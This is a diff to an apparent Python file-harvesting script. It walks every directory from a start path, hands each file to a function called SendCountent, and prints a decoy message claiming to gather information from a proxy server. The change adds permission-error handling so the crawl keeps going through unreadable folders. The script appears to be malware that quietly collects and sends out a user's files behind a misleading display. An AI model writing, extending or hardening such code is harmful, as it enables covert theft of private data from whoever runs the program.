@@ -24,12 +24,19 @@ def main(were='.'):
         try:
             for i in scandir(CP):
                 if i.is_dir():
-                    Cclass.append((var:=join(CP,i.name)))
+                    Cclass.append(join(CP,i.name))
                 else:
                     SendCountent(join(CP,i.name)) ; loop += 1
-                    print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white')+'\r')
+                    print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white'),end='\r')
             Cclass.remove(CP)
             CP = Cclass[0]
+            print('CP')
+        except PermissionError:
+            try:
+                Cclass.remove(CP)
+                CP = Cclass[0]
+            except IndexError:
+                break
         except IndexError:
             break
         except Exception as er: 
